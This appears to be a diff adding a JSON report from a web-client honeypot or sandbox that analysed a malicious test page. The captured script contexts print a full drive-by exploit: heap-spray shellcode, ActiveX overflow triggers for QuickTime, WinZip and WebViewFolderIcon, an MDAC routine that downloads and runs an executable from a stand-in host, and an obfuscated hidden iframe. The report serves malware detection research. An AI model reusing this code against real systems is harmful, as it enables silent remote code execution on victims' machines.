@@ -1,0 +1,347 @@
+{
+  "type":"analysis",
+  "service":"webclient",
+  "node":"2:2",
+  "details":
+  {
+    "structure":"list",
+    "name":"Interaction with the web page",
+    "value":
+    [
+            {
+        "structure":"list",
+        "name":"Request",
+        "value":
+        [
+          {
+            "structure":"text",
+            "name":"URL",
+            "value":"http://js.honeysploit.hsn/dangerous2.html"
+          },
+                    {
+            "structure":"integer",
+            "name":"HTTP status",
+            "value":200
+          },
+                  ]
+      },
+            {
+        "structure":"list",
+        "name":"Embedded files",
+        "value":
+        [
+                ]
+      },       {
+        "structure":"list",
+        "name":"Failed requests",
+        "value":
+        [
+                ]
+      },       {
+        "structure":"boolean",
+        "name":"HTML downloaded",
+        "value":true
+      },
+            {
+        "structure":"attachment",
+        "name":"HTML source",
+        "value":"2:0:5"
+      },
+                  {
+        "structure":"list",
+        "name":"js_contexts",
+        "value":
+        [
+                              {
+            "structure":"text",
+            "name":"context 6",
+            "value":"r = CLSID.GetObject(&quot;&quot;, name)"
+          },
+                    {
+            "structure":"text",
+            "name":"context 9",
+            "value":"startOverflow(1)"
+          },
+                    {
+            "structure":"text",
+            "name":"context 3",
+            "value":"r = CLSID.CreateObject(name)"
+          },
+                    {
+            "structure":"text",
+            "name":"context 8",
+            "value":"r = CLSID.GetObject(name)"
+          },
+                    {
+            "structure":"text",
+            "name":"context 4",
+            "value":"r = CLSID.CreateObject(name, &quot;&quot;)"
+          },
+                    {
+            "structure":"text",
+            "name":"context 5",
+            "value":"r = CLSID.CreateObject(name, &quot;&quot;, &quot;&quot;)"
+          },
+                    {
+            "structure":"text",
+            "name":"context 1",
+            "value":"
+
+var mm = new Array();
+var mem_flag = 0;
+
+function h() { mm=mm;a=1;setTimeout(&quot;h()&quot;, 2000); }
+
+function getb(b, bSize)
+{while (b.length*2&lt;bSize){b += b;}
+b = b.substring(0,bSize/2);return b;}
+
+function cf()
+{var zc = 0x0c0c0c0c;
+var a = unescape(&quot;%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33&quot; +
+&quot;%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb&quot; +
+&quot;%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7&quot; +
+&quot;%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96&quot; +
+&quot;%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85&quot; +
+&quot;%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa&quot; +
+&quot;%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf&quot; +
+&quot;%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc&quot; +
+&quot;%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba&quot; +
+&quot;%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec&quot; +
+&quot;%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c&quot; +
+&quot;%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4&quot; +
+&quot;%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07&quot; +
+&quot;%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u6D2F%u7361%u6168%u6164%u6873%u2E61%u6E69%u6F66%u6D2F%u3070%u662F%u6C69%u2E65%u6870%u0070&quot;);
+	var heapBlockSize = 0x400000;
+	var pls = a.length * 2;
+	var bSize = heapBlockSize - (pls+0x38);
+	var b = unescape(&quot;%u0c0c%u0c0c&quot;);	b = getb(b,bSize);
+	heapBlocks = (zc - 0x400000)/heapBlockSize;
+	
+	for (i=0;i&lt;heapBlocks;i++){mm[i] = b + a;}
+
+	mem_flag = 1;
+	h();
+	return mm;
+}
+
+function startWVF()
+{
+	for (i=0;i&lt;128;i++)
+	{
+		try{			var tar = new ActiveXObject(&apos;WebVi&apos;+&apos;ewFol&apos;+&apos;de&apos;+&apos;rIc&apos;+&apos;on.WebVi&apos;+&apos;ewFol&apos;+&apos;derI&apos;+&apos;con.1&apos;);
+			d = 0x7ffffffe;
+			b = 0x0c0c0c0c
+			tar.setSlice(d, b, b, b ); 
+		}catch(e){}
+	}
+}
+
+function startWinZip(object)
+{
+	var xh = &apos;A&apos;;	while (xh.length &lt; 231) xh+=&apos;A&apos;;	xh+=&quot;\x0c\x0c\x0c\x0c\x0c\x0c\x0c&quot;;	object.CreateNewFolderFromName(xh);
+}
+
+function startOverflow(num)
+{
+	if (num == 0) {
+		try {
+			var qt = new ActiveXObject(&apos;Quick&apos;+&apos;Time.Qu&apos;+&apos;ickTime&apos;);		
+			if (qt) {
+				var qthtml = &apos;&lt;object CLASSID=&quot;clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B&quot; width=&quot;1&quot; height=&quot;1&quot; style=&quot;border:0px&quot;&gt;&apos;+
+				&apos;&lt;param name=&quot;src&quot; value=&quot;qt.php&quot;&gt;&apos;+
+				&apos;&lt;param name=&quot;autoplay&quot; value=&quot;true&quot;&gt;&apos;+
+				&apos;&lt;param name=&quot;loop&quot; value=&quot;false&quot;&gt;&apos;+
+				&apos;&lt;param name=&quot;controller&quot; value=&quot;true&quot;&gt;&apos;+
+				&apos;&lt;/object&gt;&apos;;
+				if (! mem_flag) cf();
+				document.getElementById(&apos;myd&apos;+&apos;iv&apos;).innerHTML = qthtml;
+				num = 255;
+			}
+		} catch(e) { }
+
+		if (num = 255) setTimeout(&quot;startOverflow(1)&quot;, 2000);
+		else startOverflow(1);
+
+	} else if (num == 1) {
+		try {
+			var winzip = document.createElement(&quot;object&quot;);
+			winzip.setAttribute(&quot;classid&quot;, &quot;clsid:A09AE6&quot;+&quot;8F-B14D-43&quot;+&quot;ED-B713-BA413&quot;+&quot;F034904&quot;);
+
+			var ret=winzip.CreateNewFolderFromName(unescape(&quot;%00&quot;));
+			if (ret == false) {
+				if (! mem_flag) cf();
+				startWinZip(winzip);
+				num = 255;
+			}
+
+		} catch(e) { }
+
+		if (num = 255) setTimeout(&quot;startOverflow(2)&quot;, 2000);
+		else startOverflow(2);
+
+	} else if (num == 2) {
+
+		try {
+			var tar = new ActiveXObject(&apos;WebVi&apos;+&apos;ewFol&apos;+&apos;derIc&apos;+&apos;on.WebVi&apos;+&apos;ewFol&apos;+&apos;derI&apos;+&apos;con.1&apos;);
+			if (tar) {
+				if (! mem_flag) cf();
+				startWVF();
+			}
+		} catch(e) { }
+	}
+}
+
+
+function GetRandString(len)
+{
+	var chars = &quot;abcdefghiklmnopqrstuvwxyz&quot;;
+	var string_length = len;
+	var randomstring = &apos;&apos;;
+	for (var i=0; i&lt;string_length; i++) {
+		var rnum = Math.floor(Math.random() * chars.length);
+		randomstring += chars.substring(rnum,rnum+1);
+	}
+
+	return randomstring;
+}
+
+function CreateObject(CLSID, name) {
+	var r = null;
+	try { eval(&apos;r = CLSID.CreateObject(name)&apos;) }catch(e){}	
+	if (! r) { try { eval(&apos;r = CLSID.CreateObject(name, &quot;&quot;)&apos;) }catch(e){} }
+	if (! r) { try { eval(&apos;r = CLSID.CreateObject(name, &quot;&quot;, &quot;&quot;)&apos;) }catch(e){} }
+	if (! r) { try { eval(&apos;r = CLSID.GetObject(&quot;&quot;, name)&apos;) }catch(e){} }
+	if (! r) { try { eval(&apos;r = CLSID.GetObject(name, &quot;&quot;)&apos;) }catch(e){} }
+	if (! r) { try { eval(&apos;r = CLSID.GetObject(name)&apos;) }catch(e){} }
+	return(r);
+}
+
+function XMLHttpDownload(xml, url) {
+
+	try {
+		xml.open(&quot;GET&quot;, url, false);
+		xml.send(null);
+
+	} catch(e) { return 0; }
+
+	return xml.responseBody;
+}
+
+function ADOBDStreamSave(o, name, data) {
+
+	try {
+		o.Type = 1;
+		o.Mode = 3;
+		o.Open();
+		o.Write(data);
+		o.SaveToFile(name, 2);
+		o.Close();
+	} catch(e) { return 0; }
+
+	return 1;
+}
+
+function ShellExecute(exec, name, type) {
+
+	if (type == 0) {
+		try { exec.Run(name, 0); return 1; } catch(e) { }
+	} else {
+		try { exe.ShellExecute(name); return 1; } catch(e) { }
+	}
+
+	return(0);
+
+}
+
+function MDAC() {
+	var t = new Array(&apos;{BD96C5&apos;+&apos;56-65A3-11&apos;+&apos;D0-983A-00C04FC&apos;+&apos;29E30}&apos;, &apos;{BD96C&apos;+&apos;556-65A3-11&apos;+&apos;D0-983A-00C0&apos;+&apos;4FC29E36}&apos;, &apos;{AB9B&apos;+&apos;CEDD-EC7E-47&apos;+&apos;E1-9322-D4A21&apos;+&apos;0617116}&apos;, &apos;{0006F&apos;+&apos;033-0000-0000-C000-000000&apos;+&apos;000046}&apos;, &apos;{0006&apos;+&apos;F03A-0000-0000-C000-0000000&apos;+&apos;00046}&apos;, &apos;{6e32&apos;+&apos;070a-766d-4ee6-879c-dc1fa&apos;+&apos;91d2fc3}&apos;, &apos;{6414&apos;+&apos;512B-B978-451D-A0D8-FCFDF3&apos;+&apos;3E833C}&apos;, &apos;{7F5B&apos;+&apos;7F63-F06F-4331-8A26-339E03&apos;+&apos;C0AE3D}&apos;, &apos;{0672&apos;+&apos;3E09-F4C2-43&apos;+&apos;c8-8358-09FCD1D&apos;+&apos;B0766}&apos;, &apos;{639F&apos;+&apos;725F-1B2D-48&apos;+&apos;31-A9FD-87484&apos;+&apos;7682010}&apos;, &apos;{BA018&apos;+&apos;599-1DB3-44f&apos;+&apos;9-83B4-46145&apos;+&apos;4C84BF8}&apos;, &apos;{D0C07&apos;+&apos;D56-7C69-43F1-B4&apos;+&apos;A0-25F5A1&apos;+&apos;1FAB19}&apos;, &apos;{E8C&apos;+&apos;CCDDF-CA28-496b-B&apos;+&apos;050-6C07C962&apos;+&apos;476B}&apos;, null);
+	var v = new Array(null, null, null);
+	var i = 0;
+	var n = 0;
+	var ret = 0;
+	var urlRealExe = &apos;http://exploitserver.evil/best-codecs.exe&apos;;
+//	var urlRealExe = &apos;http://ftp.icm.edu.pl/pub/linux/mandriva/official/iso/2010.2/mandriva-linux-one-2010.2-KDE4-europe1-americas-cdrom-i586.iso&apos;;
+
+	while (t[i] &amp;&amp; (! v[0] || ! v[1] || ! v[2]) ) {
+		var a = null;
+
+		try {
+			a = document.createElement(&quot;object&quot;);
+			a.setAttribute(&quot;classid&quot;, &quot;clsid:&quot; + t[i].substring(1, t[i].length - 1));
+		} catch(e) { a = null; }
+		
+		if (a) {
+			if (! v[0]) {
+				v[0] = CreateObject(a, &quot;msxml2.XMLHTTP&quot;);
+				if (! v[0]) v[0] = CreateObject(a, &quot;Microso&quot;+&quot;ft.XM&quot;+&quot;LHT&quot;+&quot;TP&quot;);
+				if (! v[0]) v[0] = CreateObject(a, &quot;MSX&quot;+&quot;ML2.Se&quot;+&quot;rverXM&quot;+&quot;LHT&quot;+&quot;TP&quot;);
+			}
+
+			if (! v[1]) {
+				v[1] = CreateObject(a, &quot;ADODB.Str&quot;+&quot;eam&quot;);
+			}
+
+			if (! v[2]) {
+				v[2] = CreateObject(a, &quot;WSc&quot;+&quot;ript.Sh&quot;+&quot;ell&quot;);
+				if (! v[2]) {
+					v[2] = CreateObject(a, &quot;Shel&quot;+&quot;l.Ap&quot;+&quot;pl&quot;+&quot;icati&quot;+&quot;on&quot;);
+					if (v[2]) n=1;
+				}
+			}
+		}
+
+		i++;
+	}
+
+	if (v[0] &amp;&amp; v[1] &amp;&amp; v[2]) {
+		var data = XMLHttpDownload(v[0], urlRealExe);
+		if (data != 0) {
+			var name = &quot;c:\\sys&quot;+GetRandString(4)+&quot;.exe&quot;;
+			if (ADOBDStreamSave(v[1], name, data) == 1) {
+				if (ShellExecute(v[2], name, n) == 1) {
+					ret=1;
+				}
+			}
+		}
+	}
+
+	return ret;
+}
+
+function start() {
+
+	if (! MDAC() ) { startOverflow(0); }
+
+}
+
+"
+          },
+                    {
+            "structure":"text",
+            "name":"context 7",
+            "value":"r = CLSID.GetObject(name, &quot;&quot;)"
+          },
+                    {
+            "structure":"text",
+            "name":"context 2",
+            "value":"function() {start()
+}"
+          },
+                    {
+            "structure":"text",
+            "name":"context 0",
+            "value":"
+var _0xb55b=[&quot;\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x65\x78\x70\x6C\x6F\x69\x74\x73\x65\x72\x76\x65\x72\x2E\x65\x76\x69\x6C\x2F\x65\x69\x63\x61\x72\x2E\x68\x74\x6D\x6C\x22\x20\x77\x69\x64\x74\x68\x3D\x22\x30\x22\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x30\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E&quot;,
+&quot;\x77\x72\x69\x74\x65&quot;
+];
+document[_0xb55b[1]](_0xb55b[0]);
+"
+          },
+                   
+        ]
+      }
+    ]
+  }
+}
+
